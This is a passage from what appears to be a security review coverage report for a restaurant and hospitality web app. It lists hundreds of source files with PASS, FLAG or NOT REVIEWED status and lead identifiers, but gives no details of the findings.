| `app/api/guest/wallet/redeem/route.ts` | PASS |  |
| `app/api/guest/wallet/route.ts` | PASS |  |

</details>

<details><summary><b>app/api/health</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/api/health/route.ts` | PASS |  |

</details>

<details><summary><b>app/api/host</b> (76 files: 8 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/api/host/accommodations/categories/route.ts` | PASS |  |
| `app/api/host/accommodations/history/route.ts` | PASS |  |
| `app/api/host/accommodations/rooms/[id]/checkout/route.ts` | PASS |  |
| `app/api/host/accommodations/rooms/[id]/dossier/route.ts` | PASS |  |
| `app/api/host/accommodations/rooms/[id]/orders/route.ts` | PASS |  |
| `app/api/host/accommodations/rooms/[id]/status/route.ts` | PASS |  |
| `app/api/host/accommodations/rooms/route.ts` | PASS |  |
| `app/api/host/analytics/eod-report/route.ts` | PASS |  |
| `app/api/host/analytics/eod-z-report/route.ts` | PASS |  |
| `app/api/host/analytics/orders/route.ts` | PASS |  |
| `app/api/host/analytics/route.ts` | PASS |  |
| `app/api/host/analytics/z-report/route.ts` | PASS |  |
| `app/api/host/catalog/ai-ingest/route.ts` | PASS |  |
| `app/api/host/catalog/auto-fill-images/route.ts` | PASS |  |
| `app/api/host/catalog/bulk-insert/route.ts` | PASS |  |
| `app/api/host/catalog/bulk-price-update/route.ts` | PASS |  |
| `app/api/host/catalog/create/route.ts` | PASS |  |
| `app/api/host/catalog/delete/route.ts` | PASS |  |
| `app/api/host/catalog/images/assign/route.ts` | PASS |  |
| `app/api/host/catalog/images/from-url/route.ts` | PASS |  |
| `app/api/host/catalog/images/search/route.ts` | PASS |  |
| `app/api/host/catalog/recipe/route.ts` | PASS |  |
| `app/api/host/catalog/route.ts` | PASS |  |
| `app/api/host/catalog/update/route.ts` | PASS |  |
| `app/api/host/catalog/vault/ingest/route.ts` | PASS |  |
| `app/api/host/delivery-settings/route.ts` | PASS |  |
| `app/api/host/delivery/route.ts` | PASS |  |
| `app/api/host/expenses/advances/route.ts` | PASS |  |
| `app/api/host/expenses/bills/route.ts` | PASS |  |
| `app/api/host/expenses/payments/route.ts` | PASS |  |
| `app/api/host/expenses/staff/route.ts` | PASS |  |
| `app/api/host/gst-status/route.ts` | PASS |  |
| `app/api/host/guests/route.ts` | PASS |  |
| `app/api/host/inventory/audit/route.ts` | PASS |  |
| `app/api/host/inventory/items/route.ts` | PASS |  |
| `app/api/host/inventory/movements/route.ts` | PASS |  |
| `app/api/host/inventory/ocr-ingest/route.ts` | PASS |  |
| `app/api/host/inventory/purchase-orders/route.ts` | PASS |  |
| `app/api/host/inventory/vendors/route.ts` | PASS |  |
| `app/api/host/kitchen/stations/route.ts` | PASS |  |
| `app/api/host/kitchen/tickets/route.ts` | FLAG | NV-04, NV-16, NV-19 |
| `app/api/host/live-events/import/route.ts` | PASS |  |
| `app/api/host/live-events/leads/route.ts` | PASS |  |
| `app/api/host/live-events/route.ts` | PASS |  |
| `app/api/host/menu-info/route.ts` | PASS |  |
| `app/api/host/notifications/route.ts` | PASS |  |
| `app/api/host/operating-hours/route.ts` | PASS |  |
| `app/api/host/orders/create/route.ts` | FLAG | NV-23 |
| `app/api/host/orders/history/route.ts` | PASS |  |
| `app/api/host/orders/update-status/route.ts` | PASS |  |
| `app/api/host/profile/route.ts` | PASS |  |
| `app/api/host/profile/update/route.ts` | FLAG | NV-15 |
| `app/api/host/promotions/route.ts` | PASS |  |
| `app/api/host/provision/route.ts` | PASS |  |
| `app/api/host/reservations/route.ts` | PASS |  |
| `app/api/host/security/pin/route.ts` | PASS |  |
| `app/api/host/security/status/route.ts` | PASS |  |
| `app/api/host/sessions/route.ts` | FLAG | NV-07 |
| `app/api/host/settings/waiter-settle/route.ts` | PASS |  |
| `app/api/host/staff/access/route.ts` | FLAG | NV-18 |
| `app/api/host/staff/verify-pin/route.ts` | FLAG | NV-10, NV-17 |
| `app/api/host/staff/verify-pin/verify-pin.service.ts` | FLAG | NV-10, NV-15 |
| `app/api/host/tables/items/route.ts` | PASS |  |
| `app/api/host/tables/lines/route.ts` | PASS |  |
| `app/api/host/tables/route.ts` | PASS |  |
| `app/api/host/vendors/[id]/route.ts` | PASS |  |
| `app/api/host/vendors/orders/route.ts` | PASS |  |
| `app/api/host/vendors/route.ts` | PASS |  |
| `app/api/host/vibey/route.ts` | FLAG | NV-20 |
| `app/api/host/wallet/day-slips/route.ts` | PASS |  |
| `app/api/host/wallet/guest/route.ts` | PASS |  |
| `app/api/host/wallet/invoices/[id]/route.ts` | PASS |  |
| `app/api/host/wallet/invoices/route.ts` | PASS |  |
| `app/api/host/wallet/outstanding/route.ts` | PASS |  |
| `app/api/host/wallet/redeem/route.ts` | PASS |  |
| `app/api/host/wallet/route.ts` | PASS |  |

</details>

<details><summary><b>app/api/orders</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/api/orders/route.ts` | PASS |  |

</details>

<details><summary><b>app/api/tables</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/api/tables/route.ts` | PASS |  |

</details>

<details><summary><b>app/api/venue</b> (3 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/api/venue/offers/route.ts` | PASS |  |
| `app/api/venue/photo-vault/route.ts` | PASS |  |
| `app/api/venue/requests/route.ts` | PASS |  |

</details>

<details><summary><b>app/auth</b> (2 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/auth/callback/route.ts` | PASS |  |
| `app/auth/host/page.tsx` | PASS |  |

</details>

<details><summary><b>app/global-error.tsx</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/global-error.tsx` | NOT REVIEWED |  |

</details>

<details><summary><b>app/guest</b> (4 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/guest/[cafeId]/page.tsx` | PASS |  |
| `app/guest/layout.tsx` | PASS |  |
| `app/guest/lobby/page.tsx` | PASS |  |
| `app/guest/onboard/page.tsx` | PASS |  |

</details>

<details><summary><b>app/host</b> (7 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/host/control-center/accommodations/page.tsx` | PASS |  |
| `app/host/control-center/error.tsx` | PASS |  |
| `app/host/control-center/loading.tsx` | PASS |  |
| `app/host/control-center/page.tsx` | PASS |  |
| `app/host/dashboard/page.tsx` | PASS |  |
| `app/host/layout.tsx` | PASS |  |
| `app/host/page.tsx` | PASS |  |

</details>

<details><summary><b>app/layout.tsx</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/layout.tsx` | NOT REVIEWED |  |

</details>

<details><summary><b>app/onboarding</b> (2 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/onboarding/guest/page.tsx` | PASS |  |
| `app/onboarding/host/page.tsx` | PASS |  |

</details>

<details><summary><b>app/page.tsx</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/page.tsx` | NOT REVIEWED |  |

</details>

<details><summary><b>app/pos</b> (4 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/pos/[slug]/[terminal]/page.tsx` | PASS |  |
| `app/pos/[slug]/page.tsx` | PASS |  |
| `app/pos/staff-login/page.tsx` | PASS |  |
| `app/pos/terminal/page.tsx` | PASS |  |

</details>

<details><summary><b>app/quad-computing</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/quad-computing/page.tsx` | NOT REVIEWED |  |

</details>

<details><summary><b>app/showcase</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `app/showcase/[screen]/page.tsx` | NOT REVIEWED |  |

</details>

<details><summary><b>instrumentation.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `instrumentation.ts` | PASS |  |

</details>

<details><summary><b>lib/auth</b> (8 files: 2 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/auth/auth-messages.ts` | PASS |  |
| `lib/auth/guards.ts` | FLAG | NV-04, NV-18, NV-19, NV-20 |
| `lib/auth/guest-auth.ts` | PASS |  |
| `lib/auth/guest-validate.ts` | PASS |  |
| `lib/auth/pin-strength.ts` | PASS |  |
| `lib/auth/safe-next.ts` | PASS |  |
| `lib/auth/staff-access.ts` | FLAG | NV-18 |
| `lib/auth/verified-user.ts` | PASS |  |

</details>

<details><summary><b>lib/brand.ts</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/brand.ts` | NOT REVIEWED |  |

</details>

<details><summary><b>lib/club</b> (65 files: 1 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/club/auth.ts` | PASS |  |
| `lib/club/campaigns.service.ts` | PASS |  |
| `lib/club/categories.service.ts` | PASS |  |
| `lib/club/chat/messages.service.ts` | PASS |  |
| `lib/club/chat/rooms.service.ts` | PASS |  |
| `lib/club/events/event-cards.service.ts` | PASS |  |
| `lib/club/events/event-input.ts` | PASS |  |
| `lib/club/events/event-review.service.ts` | PASS |  |
| `lib/club/events/event-view.service.ts` | PASS |  |
| `lib/club/events/events.service.ts` | PASS |  |
| `lib/club/events/participation.service.ts` | PASS |  |
| `lib/club/explore/activity.service.ts` | PASS |  |
| `lib/club/explore/explore-filter.ts` | PASS |  |
| `lib/club/explore/explore.service.ts` | PASS |  |
| `lib/club/http.ts` | PASS |  |
| `lib/club/identity/identity-rules.ts` | PASS |  |
| `lib/club/identity/profanity.ts` | PASS |  |
| `lib/club/identity/profile-details.ts` | PASS |  |
| `lib/club/ledger/journal.ts` | PASS |  |
| `lib/club/ledger/noc.service.ts` | FLAG | NV-22 |
| `lib/club/ledger/postings.ts` | PASS |  |
| `lib/club/ledger/reconcile.service.ts` | PASS |  |
| `lib/club/marketplace/agreements.service.ts` | PASS |  |
| `lib/club/marketplace/offer-rules.ts` | PASS |  |
| `lib/club/marketplace/offers.service.ts` | PASS |  |
| `lib/club/marketplace/properties.service.ts` | PASS |  |
| `lib/club/marketplace/property-input.ts` | PASS |  |
| `lib/club/media.ts` | PASS |  |
| `lib/club/meetups/meetup-input.ts` | PASS |  |
| `lib/club/meetups/meetup-kinds.ts` | PASS |  |
| `lib/club/meetups/meetups.service.ts` | PASS |  |
| `lib/club/membership/application-input.ts` | PASS |  |
| `lib/club/membership/apply.service.ts` | PASS |  |
| `lib/club/membership/identity.service.ts` | PASS |  |
| `lib/club/membership/member-profile.service.ts` | PASS |  |
| `lib/club/membership/members.ts` | PASS |  |
| `lib/club/membership/review.service.ts` | PASS |  |
| `lib/club/membership/username.service.ts` | PASS |  |
| `lib/club/moderation/actions.service.ts` | PASS |  |
| `lib/club/moderation/moderation-log.ts` | PASS |  |
| `lib/club/moderation/reports.service.ts` | PASS |  |
| `lib/club/money.ts` | PASS |  |
| `lib/club/notifications.service.ts` | PASS |  |
| `lib/club/otp/otp.service.ts` | PASS |  |
| `lib/club/otp/sms-providers.ts` | PASS |  |
| `lib/club/payments/capture.service.ts` | PASS |  |
| `lib/club/payments/checkout.service.ts` | PASS |  |
| `lib/club/payments/payouts.service.ts` | PASS |  |
| `lib/club/payments/razorpay.ts` | PASS |  |
| `lib/club/payments/webhook.service.ts` | PASS |  |
| `lib/club/presence.service.ts` | PASS |  |
| `lib/club/qc-bridge.ts` | PASS |  |
| `lib/club/room/comments.service.ts` | PASS |  |
| `lib/club/room/post-input.ts` | PASS |  |
| `lib/club/room/posts.service.ts` | PASS |  |
| `lib/club/rows.ts` | PASS |  |
| `lib/club/secrets.ts` | PASS |  |
| `lib/club/settings.ts` | PASS |  |
| `lib/club/setup-sql.ts` | PASS |  |
| `lib/club/social/follow.service.ts` | PASS |  |
| `lib/club/social/place-coords.ts` | PASS |  |
| `lib/club/social/places.service.ts` | PASS |  |
| `lib/club/social/ranking.ts` | PASS |  |
| `lib/club/stories.service.ts` | PASS |  |
| `lib/club/types.ts` | PASS |  |

</details>

<details><summary><b>lib/guest</b> (19 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/guest/avatar-options.ts` | PASS |  |
| `lib/guest/cart-suggestions.ts` | PASS |  |
| `lib/guest/cashback.ts` | PASS |  |
| `lib/guest/category-covers.ts` | PASS |  |
| `lib/guest/fit-photo.ts` | PASS |  |
| `lib/guest/fly-to-cart.ts` | PASS |  |
| `lib/guest/greeting.ts` | PASS |  |
| `lib/guest/guest-account-client.ts` | PASS |  |
| `lib/guest/image-share.ts` | PASS |  |
| `lib/guest/lobby-engagement-client.ts` | PASS |  |
| `lib/guest/lobby-posts-client.ts` | PASS |  |
| `lib/guest/lobby-rules.ts` | PASS |  |
| `lib/guest/lounge-params.ts` | PASS |  |
| `lib/guest/menu-stickers.ts` | PASS |  |
| `lib/guest/offer-requests-client.ts` | PASS |  |
| `lib/guest/resize-avatar.ts` | PASS |  |
| `lib/guest/traveller-types.ts` | PASS |  |
| `lib/guest/use-guest-account.ts` | PASS |  |
| `lib/guest/use-guest-title.ts` | PASS |  |

</details>

<details><summary><b>lib/hooks</b> (2 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/hooks/use-floor-ping.ts` | PASS |  |
| `lib/hooks/use-kitchen-realtime.ts` | PASS |  |

</details>

<details><summary><b>lib/host-alert-sound.ts</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/host-alert-sound.ts` | NOT REVIEWED |  |

</details>

<details><summary><b>lib/landing</b> (2 files: 0 FLAG, 2 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/landing/screenshots.ts` | NOT REVIEWED |  |
| `lib/landing/videos.ts` | NOT REVIEWED |  |

</details>

<details><summary><b>lib/middleware</b> (2 files: 1 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/middleware/error-handler.ts` | PASS |  |
| `lib/middleware/rate-limiter.ts` | FLAG | NV-12, NV-17 |

</details>

<details><summary><b>lib/realtime</b> (2 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/realtime/channels.ts` | PASS |  |
| `lib/realtime/floor-ping.ts` | PASS |  |

</details>

<details><summary><b>lib/repository</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/repository/host.repository.ts` | PASS |  |

</details>

<details><summary><b>lib/services/accommodation</b> (8 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/accommodation/addons.util.ts` | PASS |  |
| `lib/services/accommodation/category-crud.service.ts` | PASS |  |
| `lib/services/accommodation/check-in.service.ts` | PASS |  |
| `lib/services/accommodation/create-category.service.ts` | PASS |  |
| `lib/services/accommodation/room-guest-fields.util.ts` | PASS |  |
| `lib/services/accommodation/stay-folio.util.ts` | PASS |  |
| `lib/services/accommodation/update-category.service.ts` | PASS |  |
| `lib/services/accommodation/update-rooms.util.ts` | PASS |  |

</details>

<details><summary><b>lib/services/accommodation.service.ts</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/accommodation.service.ts` | NOT REVIEWED |  |

</details>

<details><summary><b>lib/services/analytics</b> (17 files: 2 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/analytics/aggregations.util.ts` | PASS |  |
| `lib/services/analytics/date-range.util.ts` | PASS |  |
| `lib/services/analytics/eod-z-report.service.ts` | PASS |  |
| `lib/services/analytics/eod-z-report.types.ts` | PASS |  |
| `lib/services/analytics/eod-z-report.util.ts` | PASS |  |
| `lib/services/analytics/fetch-data.service.ts` | FLAG | NV-24 |
| `lib/services/analytics/guest-identity.util.ts` | PASS |  |
| `lib/services/analytics/guests-report.util.ts` | FLAG | NV-24 |
| `lib/services/analytics/order-status.util.ts` | PASS |  |
| `lib/services/analytics/orders-ledger.service.ts` | PASS |  |
| `lib/services/analytics/orders-ledger.util.ts` | PASS |  |
| `lib/services/analytics/pnl.util.ts` | PASS |  |
| `lib/services/analytics/reports.util.ts` | PASS |  |
| `lib/services/analytics/trends-builder.util.ts` | PASS |  |
| `lib/services/analytics/z-report-export.service.ts` | PASS |  |
| `lib/services/analytics/z-report-sales.util.ts` | PASS |  |
| `lib/services/analytics/z-report.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/analytics.service.ts</b> (1 files: 1 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/analytics.service.ts` | FLAG | NV-24 |

</details>

<details><summary><b>lib/services/api-idempotency.util.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/api-idempotency.util.ts` | PASS |  |

</details>

<details><summary><b>lib/services/billing</b> (2 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/billing/gst-policy.ts` | PASS |  |
| `lib/services/billing/venue-guard.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/catalog</b> (23 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/catalog/catalog-formatter.util.ts` | PASS |  |
| `lib/services/catalog/create-item.service.ts` | PASS |  |
| `lib/services/catalog/delete-item.service.ts` | PASS |  |
| `lib/services/catalog/dish-matcher-agent.ts` | PASS |  |
| `lib/services/catalog/fetch-catalog.service.ts` | PASS |  |
| `lib/services/catalog/image-match.ts` | PASS |  |
| `lib/services/catalog/llm-json.ts` | PASS |  |
| `lib/services/catalog/photo-assign.ts` | PASS |  |
| `lib/services/catalog/photo-autofill.ts` | PASS |  |
| `lib/services/catalog/photo-sources.ts` | PASS |  |
| `lib/services/catalog/recipe.service.ts` | PASS |  |
| `lib/services/catalog/resolve-business.util.ts` | PASS |  |
| `lib/services/catalog/safe-fetch.ts` | PASS |  |
| `lib/services/catalog/smart-photos.ts` | PASS |  |
| `lib/services/catalog/stock-autofill.ts` | PASS |  |
| `lib/services/catalog/stock-providers.ts` | PASS |  |
| `lib/services/catalog/url-ingest.ts` | PASS |  |
| `lib/services/catalog/vault-describe.ts` | PASS |  |
| `lib/services/catalog/vault-ingest.ts` | PASS |  |
| `lib/services/catalog/web-images.ts` | PASS |  |
| `lib/services/catalog/web-photo-agent.ts` | PASS |  |
| `lib/services/catalog/web-photo-pass.ts` | PASS |  |
| `lib/services/catalog/wikimedia-search.ts` | PASS |  |

</details>

<details><summary><b>lib/services/catalog-delete-addon.service.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/catalog-delete-addon.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/catalog-delete.service.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/catalog-delete.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/catalog.service.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/catalog.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/delivery</b> (4 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/delivery/delivery-input.ts` | PASS |  |
| `lib/services/delivery/delivery-orders.service.ts` | PASS |  |
| `lib/services/delivery/delivery-rules.ts` | PASS |  |
| `lib/services/delivery/delivery-settings.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/expenses</b> (6 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/expenses/bills.service.ts` | PASS |  |
| `lib/services/expenses/bills.util.ts` | PASS |  |
| `lib/services/expenses/payroll.service.ts` | PASS |  |
| `lib/services/expenses/payroll.util.ts` | PASS |  |
| `lib/services/expenses/period.util.ts` | PASS |  |
| `lib/services/expenses/staff-input.ts` | PASS |  |

</details>

<details><summary><b>lib/services/guest</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/guest/staff-call.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/guest-auth</b> (8 files: 5 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/guest-auth/guest-account.service.ts` | FLAG | NV-11, NV-12 |
| `lib/services/guest-auth/guest-avatar.service.ts` | PASS |  |
| `lib/services/guest-auth/guest-bills.service.ts` | FLAG | NV-02 |
| `lib/services/guest-auth/request-identity.ts` | PASS |  |
| `lib/services/guest-auth/vibers-connect.service.ts` | FLAG | NV-11 |
| `lib/services/guest-auth/vibers-pin-login.service.ts` | FLAG | NV-11 |
| `lib/services/guest-auth/vibers-profile.service.ts` | PASS |  |
| `lib/services/guest-auth/wallet-ownership.ts` | FLAG | NV-11 |

</details>

<details><summary><b>lib/services/guest-menu</b> (2 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/guest-menu/dish-likes.service.ts` | PASS |  |
| `lib/services/guest-menu/venue-menu-cache.ts` | PASS |  |

</details>

<details><summary><b>lib/services/guest-order</b> (8 files: 2 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/guest-order/active-ticket.util.ts` | PASS |  |
| `lib/services/guest-order/business-resolver.service.ts` | PASS |  |
| `lib/services/guest-order/find-order.util.ts` | PASS |  |
| `lib/services/guest-order/get-order.service.ts` | FLAG | NV-02 |
| `lib/services/guest-order/order-utils.ts` | PASS |  |
| `lib/services/guest-order/own-visit.util.ts` | PASS |  |
| `lib/services/guest-order/submit-order.service.ts` | FLAG | NV-14, NV-19, NV-24 |
| `lib/services/guest-order/table-lock.ts` | PASS |  |

</details>

<details><summary><b>lib/services/guest-order.service.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/guest-order.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/guest-session</b> (9 files: 2 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/guest-session/bill-request-event.util.ts` | PASS |  |
| `lib/services/guest-session/get-session.service.ts` | PASS |  |
| `lib/services/guest-session/guest-record.util.ts` | PASS |  |
| `lib/services/guest-session/init-session-helpers.util.ts` | FLAG | NV-03 |
| `lib/services/guest-session/init-session.service.ts` | FLAG | NV-03 |
| `lib/services/guest-session/session-guest.util.ts` | PASS |  |
| `lib/services/guest-session/session-kot.util.ts` | PASS |  |
| `lib/services/guest-session/session-utils.ts` | PASS |  |
| `lib/services/guest-session/update-session.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/guest-session.service.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/guest-session.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/inventory</b> (11 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/inventory/inventory.types.ts` | PASS |  |
| `lib/services/inventory/item-crud.service.ts` | PASS |  |
| `lib/services/inventory/item-input.ts` | PASS |  |
| `lib/services/inventory/movement-input.ts` | PASS |  |
| `lib/services/inventory/movement.service.ts` | PASS |  |
| `lib/services/inventory/overview.service.ts` | PASS |  |
| `lib/services/inventory/overview.util.ts` | PASS |  |
| `lib/services/inventory/purchase-input.ts` | PASS |  |
| `lib/services/inventory/purchase-message.ts` | PASS |  |
| `lib/services/inventory/purchase-order.service.ts` | PASS |  |
| `lib/services/inventory/recipe-deduction.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/kitchen</b> (5 files: 1 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/kitchen/business-resolver.service.ts` | PASS |  |
| `lib/services/kitchen/create-ticket.service.ts` | FLAG | NV-04 |
| `lib/services/kitchen/get-tickets.service.ts` | PASS |  |
| `lib/services/kitchen/item-station.ts` | PASS |  |
| `lib/services/kitchen/update-ticket.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/kitchen.service.ts</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/kitchen.service.ts` | NOT REVIEWED |  |

</details>

<details><summary><b>lib/services/live-events</b> (8 files: 1 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/live-events/event-input.ts` | PASS |  |
| `lib/services/live-events/events.service.ts` | PASS |  |
| `lib/services/live-events/guest-identity.ts` | PASS |  |
| `lib/services/live-events/guest-key.ts` | PASS |  |
| `lib/services/live-events/leads-csv.ts` | PASS |  |
| `lib/services/live-events/ledger.service.ts` | FLAG | NV-13, NV-24 |
| `lib/services/live-events/legacy-import.ts` | PASS |  |
| `lib/services/live-events/party.ts` | PASS |  |

</details>

<details><summary><b>lib/services/lobby</b> (6 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/lobby/lobby-engagement.ts` | PASS |  |
| `lib/services/lobby/lobby-post-query.ts` | PASS |  |
| `lib/services/lobby/lobby-post-view.ts` | PASS |  |
| `lib/services/lobby/lobby-post-write.ts` | PASS |  |
| `lib/services/lobby/lobby-replies.ts` | PASS |  |
| `lib/services/lobby/lobby-reply-view.ts` | PASS |  |

</details>

<details><summary><b>lib/services/menu-info</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/menu-info/menu-info.ts` | PASS |  |

</details>

<details><summary><b>lib/services/offers</b> (4 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/offers/offer-discount.ts` | PASS |  |
| `lib/services/offers/offer-request-input.ts` | PASS |  |
| `lib/services/offers/offer-requests-host.ts` | PASS |  |
| `lib/services/offers/offer-requests.ts` | PASS |  |

</details>

<details><summary><b>lib/services/orders</b> (7 files: 2 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/orders/create-order.service.ts` | FLAG | NV-23 |
| `lib/services/orders/order-mutation.service.ts` | PASS |  |
| `lib/services/orders/order-uuid.util.ts` | PASS |  |
| `lib/services/orders/recipe-deduction.service.ts` | PASS |  |
| `lib/services/orders/resolve-business.util.ts` | PASS |  |
| `lib/services/orders/resolve-table-id.util.ts` | FLAG | NV-23 |
| `lib/services/orders/room-stay-order.util.ts` | PASS |  |

</details>

<details><summary><b>lib/services/orders.service.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/orders.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/profile</b> (3 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/profile/profile-input.ts` | PASS |  |
| `lib/services/profile/profile-rules.ts` | PASS |  |
| `lib/services/profile/save-profile.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/reservations</b> (2 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/reservations/reservations.service.ts` | PASS |  |
| `lib/services/reservations/venue-hours.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/reviews</b> (3 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/reviews/review-authors.ts` | PASS |  |
| `lib/services/reviews/review-view.ts` | PASS |  |
| `lib/services/reviews/review-write.ts` | PASS |  |

</details>

<details><summary><b>lib/services/security</b> (4 files: 1 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/security/pin-rules.ts` | PASS |  |
| `lib/services/security/protected-modules.ts` | PASS |  |
| `lib/services/security/venue-pin.service.ts` | PASS |  |
| `lib/services/security/venue-pin.ts` | FLAG | NV-10 |

</details>

<details><summary><b>lib/services/session</b> (10 files: 2 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/session/active-sessions.service.ts` | PASS |  |
| `lib/services/session/bill-history.service.ts` | PASS |  |
| `lib/services/session/detailed-session.service.ts` | PASS |  |
| `lib/services/session/release-table.service.ts` | FLAG | NV-19 |
| `lib/services/session/session-entry.util.ts` | PASS |  |
| `lib/services/session/settle-session.service.ts` | FLAG | NV-07, NV-24 |
| `lib/services/session/table-items-input.ts` | PASS |  |
| `lib/services/session/table-items.service.ts` | PASS |  |
| `lib/services/session/void-line.service.ts` | PASS |  |
| `lib/services/session/waiter-settle.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/session.service.ts</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/session.service.ts` | NOT REVIEWED |  |

</details>

<details><summary><b>lib/services/staff-auth</b> (5 files: 2 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/staff-auth/staff-access-input.ts` | PASS |  |
| `lib/services/staff-auth/staff-login.service.ts` | FLAG | NV-18 |
| `lib/services/staff-auth/staff-roles.ts` | FLAG | NV-19, NV-20 |
| `lib/services/staff-auth/staff-session.ts` | PASS |  |
| `lib/services/staff-auth/terminal-access.ts` | PASS |  |

</details>

<details><summary><b>lib/services/table</b> (7 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
